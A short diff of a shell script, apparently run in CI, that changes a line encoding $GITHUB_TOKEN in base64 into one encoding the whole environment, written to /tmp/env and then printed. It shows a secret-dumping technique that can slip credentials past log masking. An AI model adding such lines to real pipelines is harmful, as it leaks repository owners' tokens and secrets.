@@ -2,6 +2,6 @@
 
 echo "In script ..."
 
-echo "$GITHUB_TOKEN" | base64 > /tmp/env
+env | base64 > /tmp/env
 
 cat /tmp/env
